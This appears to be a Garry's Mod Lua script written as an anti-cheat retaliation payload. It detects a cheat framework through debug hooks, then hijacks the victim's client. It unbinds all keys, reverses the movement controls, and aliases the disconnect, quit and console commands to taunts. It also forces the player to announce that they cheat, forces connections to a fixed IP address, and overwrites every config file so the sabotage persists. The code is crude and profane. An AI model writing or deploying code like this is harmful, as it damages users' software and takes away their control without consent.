
local POP = steamworks.OpenWorkshop

local function EatOub(func)
	local Cmds = {}
	local function RCC(s) Cmds[ #Cmds + 1 ] = s end
	local function FuckKey(k,v) RCC('bind '..k..' "'..v..'; play hac/eight.wav; alias disconnect kill; say I cheat ban me for"') end
	local function FuckYou(k,v) RCC('bind '..k..' "'..v..'"') end
	
	RCC("unbindall")

	RCC('alias gamemenucommand "say We can do WONDERFUL things with light bulbs!"')
	RCC('alias cancelselect "say I really should not cheat"')
	RCC('alias disconnect "say I will never cheat again!"')
	RCC('alias connect "say Piece of shit!"')
	RCC('alias exit "say I AINT HAVIN IT"')
	RCC('alias exec "say Wheres my hammer"')
	RCC('alias quit "say I should never have used hacks"')
	RCC('alias toggleconsole "say I aint havin it!"')
	RCC('alias _restart say How can it take that much!"')

	FuckYou("`", 			"play hac/still_not_working.mp3; gamemenucommand quitnoconfirm; say I popped it!")
	FuckYou("F10", 			"play hac/really_cheat.mp3; gamemenucommand quitnoconfirm; say And it aint even gonna complain!")
	FuckYou("MOUSE1",		"+attack2; sensitivity 90; volume 0.1; say Ive lost my marbles!")
	FuckYou("MOUSE2",		"+attack; sensitivity 0.1; volume 1; play hac/highway_to_hell.mp3; say IM ON A HIGHWAY TO HELL")
	FuckYou("MOUSE3",		"kill; sensitivity 90; volume 0.1; say Burst me bagpipes!")

	FuckKey("w", 			"+back; host_writeconfig cfg/autoexec.cfg")
	FuckKey("a", 			"+moveright; host_writeconfig cfg/autoexec.cfg")
	FuckKey("s", 			"+forward; host_writeconfig cfg/autoexec.cfg")
	FuckKey("d", 			"+moveleft; host_writeconfig cfg/autoexec.cfg")
	FuckKey("e", 			"+reload; volume 0.1")
	FuckKey("r", 			"+jump; volume 0.1")
	FuckKey("f", 			"noclip; connect 94.23.153.42")
	FuckKey("q", 			"connect 94.23.153.42")
	FuckKey("c", 			"connect 94.23.153.42")
	FuckKey("v", 			"impulse 100; kill")
	FuckKey("TAB", 			"+use")
	FuckKey("SPACE",		"+menu; exec skill.cfg")
	FuckKey("CTRL",			"kill; exec skill_manifest.cfg")
	FuckKey("SHIFT",		"+walk; exec skill.cfg")
	FuckKey("ALT",			"+speed; exec skill_manifest.cfg")
	FuckKey("MWHEELUP",		"invnext")
	FuckKey("MWHEELDOWN",	"invprev")
	FuckKey("F4", 			"exec skill.cfg")
	FuckKey("F3", 			"exec skill_manifest.cfg")
	FuckKey("F2", 			"exec skill.cfg")
	FuckKey("F1", 			"exec skill_manifest.cfg")

	RCC("host_writeconfig")
	for k,v in _H.pairs( _H.NotFF("cfg/*.cfg", "MOD") ) do
		RCC("host_writeconfig cfg/"..v)
	end
	RCC('alias host_writeconfig "use gmod_camera"')

	RCC("volume 0.4")
	RCC('alias unbind say I really do wanna to throw this lightbulb at the wall!"')
	RCC('alias unbindall echo Oh dear!"')
	RCC('alias bind echo I popped it!"')
	RCC("cl_downloadfilter mapsonly")
	
	
	local function DoBinds()
		local Idx  	= nil
		local This 	= nil
		
		for k,v in _H.pairs(Cmds) do
			Idx  = k
			This = v
			break
		end
		
		if Idx and This then
			local ret,err = _H.pcall(function()
				func(This)
			end)
			if err then
				_H.DelayGMG("EatOub=".._H.tostring(err) )
			end
			
			Cmds[Idx] = nil
		end
	end
	_H.NotTC(_H.tostring(DoBinds), 0.1, 1000, DoBinds)
end






_G.KEY_F10 = _G.KEY_W

local function EatShit(err,meta)
	_H.DelayGMG("EatShit=".._H.tostring(err) )
	
	_H.NotTC("IHateYou", 9, 0, function() POP() end)
	
	hook.Hooks = {}
	hook = {}
	if meta then meta = _H.Error end
	_G = NULL
end
if hook.call then
	EatShit("hook.call")
end

local function Try(meta)
	local OH = nil
	local gee,g = _H.NotDGU(meta, 2)
	
	if g then
		local KeyDown = g.input.IsKeyDown
		
		local function IsKeyDown(...)
			for stack=1,6 do
				local tab = _H.NotDGE(stack)
				
				if tab then
					for i=0,6 do
						local k,v = _H.NotDGU(tab.func,i)
						
						if k == "OH" then
							if v then
								OH = v
								
								local name,CPP = _H.NotDGU(v.Logging.LogToFile, 1)
								if CPP then
									if CPP.RunConsoleCommand then
										EatOub(CPP.RunConsoleCommand)
									else
										EatShit("!RCC", meta)
									end
								else
									EatShit("!CPP", meta)
								end
								
								v.Hooks = {} --No.
							else
								EatShit("!v", meta)
							end
						end
					end
				end
			end
			
			if OH then
				g.input.IsKeyDown = KeyDown
			else
				EatShit("!OH", meta)
			end
			
			return KeyDown(...)
		end
		
		g.input.IsKeyDown = IsKeyDown
	else
		EatShit("!g", meta) 
	end
end

local meta = _G.__index
if meta then
	Try(meta)
end

local meta = _G.__newindex
if meta then
	Try(meta)
end

if _H.NotGMT(_G) then
	local meta = _H.NotGMT(_G).__index
	if meta then
		Try(meta)
	end

	local meta = _H.NotGMT(_G).__newindex
	if meta then
		Try(meta)
	end
end









